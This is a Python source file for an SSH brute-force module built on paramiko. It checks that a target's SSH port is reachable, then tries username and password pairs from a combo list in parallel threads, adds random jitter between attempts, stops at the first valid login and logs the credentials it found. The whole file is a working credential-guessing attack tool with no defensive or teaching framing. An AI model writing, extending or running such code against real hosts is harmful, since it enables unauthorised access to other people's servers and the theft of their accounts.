# ssh brute force module

import paramiko
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import random
import socket
import logging

# Disable paramiko logging ke stderr
paramiko.util.logging.getLogger("paramiko").setLevel(logging.CRITICAL)

class BruteForceSSH:
    def __init__(self, target_ip, target_port=22, combo_list=[], max_workers=10, max_errors=10):
        self.info = "SSH brute force module (enhanced)"
        self.targetIP = target_ip
        self.targetPORT = target_port
        self.combos = combo_list
        self.max_workers = max_workers
        self.max_errors = max_errors
        self.lock = threading.Lock()
        self.found = False
        self.valid_cred = None
        self.error_count = 0

    def is_ssh_open(self):
        try:
            with socket.create_connection((self.targetIP, self.targetPORT), timeout=3):
                return True
        except:
            return False

    def attempt_login(self, username, password):
        if self.found or self.error_count >= self.max_errors:
            return None

        time.sleep(random.uniform(0.2, 1.0))  # jitter

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.targetIP, port=self.targetPORT, username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False)
            with self.lock:
                if not self.found:
                    self.found = True
                    self.valid_cred = (username, password)
                    logging.debug(f"Valid SSH credentials found: {username}:{password}")
            ssh.close()
            return (username, password)

        except paramiko.AuthenticationException:
            return None
        except Exception as e:
            with self.lock:
                self.error_count += 1
            logging.debug(f"Error attempting {username}:{password} - {str(e)}")
            return None

    def run(self):
        if not self.is_ssh_open():
            logging.warning("SSH port not open or target not reachable.")
            return None

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.attempt_login, u, p) for u, p in self.combos]

            for future in as_completed(futures):
                if self.found or self.error_count >= self.max_errors:
                    break

        return self.valid_cred if self.valid_cred else None